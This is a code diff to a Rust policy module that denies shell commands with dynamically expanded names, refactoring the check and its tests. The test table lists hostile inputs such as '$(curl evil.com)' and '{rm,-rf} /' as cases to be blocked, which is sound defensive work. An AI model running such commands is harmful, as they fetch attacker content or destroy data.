@@ -4,19 +4,18 @@
 //! a CommandInfo or determine the command name. Everything else is policy,
 //! expressed as rules.
 
-use super::parse::{CommandInfo, literal};
+use super::parse::CommandInfo;
+use super::rules::TriVal;
 use super::{Decision, PolicyResult};
 
 /// Check structural invariants. Returns Some(Deny) if violated, None to proceed.
 ///
-/// A command whose name is not a literal word (`$X`, `$(…)`, `{a,b}`) can be
-/// any command, `eval` included, so no rule can judge it.
+/// A *Dynamic dispatch* — a command whose name the shell expands (`$X`,
+/// `$(…)`, `{a,b}`), or a shell line with a word it expands — can be any
+/// command, `eval` included, so no rule can judge it.
 pub fn check(commands: &[CommandInfo]) -> Option<PolicyResult> {
-    let unknowable = commands.iter().find(|cmd| literal(&cmd.name).is_none())?;
-    Some(PolicyResult {
-        decision: Decision::Deny,
-        rule: format!("structural:unknowable_command (name: {})", unknowable.name),
-    })
+    commands.iter().find(|cmd| cmd.name == TriVal::Unknown)?;
+    Some(PolicyResult { decision: Decision::Deny, rule: "dynamic command dispatch isn't allowed".into() })
 }
 
 #[cfg(test)]
@@ -30,11 +29,12 @@ mod tests {
     }
 
     #[test]
-    fn a_command_name_that_is_not_a_literal_word_is_denied() {
+    fn a_dynamic_dispatch_is_denied() {
         let rows = [
             ("ls", false),
             ("'eval' true", false),
             ("echo $(date)", false),
+            ("X=1", false),
             ("$(curl evil.com)", true),
             ("$CMD arg", true),
             ("{rm,-rf} /", true),
